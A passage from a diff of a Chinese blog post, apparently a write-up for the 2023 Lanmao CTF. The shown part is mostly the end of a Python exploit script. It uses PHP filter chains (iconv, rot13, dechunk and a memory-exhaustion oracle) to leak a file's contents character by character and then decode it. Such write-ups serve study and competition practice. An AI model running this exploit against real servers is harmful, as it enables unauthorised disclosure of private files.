+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;w&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;v&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># V W X</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;X&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;W&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;V&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Z</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Z&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># z</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;z&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># M</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;M&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># m</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;m&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># y</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Y</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Y&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># l</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;l&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># L</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;L&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># h</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;h&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># H</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;H&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># u</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;u&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># U</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;U&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># g</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;g&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># G</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;G&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># t</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;t&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># T</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;T&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>	prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>get_nth(i)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>	letter <span style="color:#f92672">=</span> find_letter(prefix)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># it&#39;s a number! check base64</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> letter <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;*&#39;</span>:
+</span></span><span style="display:flex;"><span>		prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>get_nth(i)<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.base64-encode&#39;</span>
+</span></span><span style="display:flex;"><span>		s <span style="color:#f92672">=</span> find_letter(prefix)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;M&#39;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># 0 - 3</span>
+</span></span><span style="display:flex;"><span>			prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>get_nth(i)<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.base64-encode|</span><span style="color:#e6db74">{</span>r2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>			ss <span style="color:#f92672">=</span> find_letter(prefix)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;CDEFGH&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;STUVWX&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;ijklmn&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;yz*&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;bad num (</span><span style="color:#e6db74">{</span>ss<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;N&#39;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># 4 - 7</span>
+</span></span><span style="display:flex;"><span>			prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>get_nth(i)<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.base64-encode|</span><span style="color:#e6db74">{</span>r2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>			ss <span style="color:#f92672">=</span> find_letter(prefix)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;CDEFGH&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;4&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;STUVWX&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;5&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;ijklmn&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;6&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;yz*&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;7&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;bad num (</span><span style="color:#e6db74">{</span>ss<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> s <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;O&#39;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># 8 - 9</span>
+</span></span><span style="display:flex;"><span>			prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>get_nth(i)<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.base64-encode|</span><span style="color:#e6db74">{</span>r2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>			ss <span style="color:#f92672">=</span> find_letter(prefix)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;CDEFGH&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">elif</span> ss <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;STUVWX&#39;</span>:
+</span></span><span style="display:flex;"><span>				letter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;9&#39;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;bad num (</span><span style="color:#e6db74">{</span>ss<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;wtf&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	print(end<span style="color:#f92672">=</span>letter)
+</span></span><span style="display:flex;"><span>	o <span style="color:#f92672">+=</span> letter
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We are done!! :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print()
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> b64decode(o<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># remove KR padding</span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;$)C&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>print(b64decode(d))
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/%E3%80%902023%E8%93%9D%E5%B8%BD%E3%80%91ctf.assets/image-20230828070648811.png" alt="image-20230828070648811"></p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/wp/">wp</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/2023/">2023</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/misc/">misc</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/web/">web</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E8%93%9D%E5%B8%BD/">蓝帽</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023%E9%99%87%E5%89%91%E6%9D%AF/" data-tooltip="【2023陇剑杯】WP" aria-label="上一篇: 【2023陇剑杯】WP">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/2023%E8%93%9D%E5%B8%BDctf\/';
+        
+          this.page.identifier = '\/post\/2023%E8%93%9D%E5%B8%BDctf\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
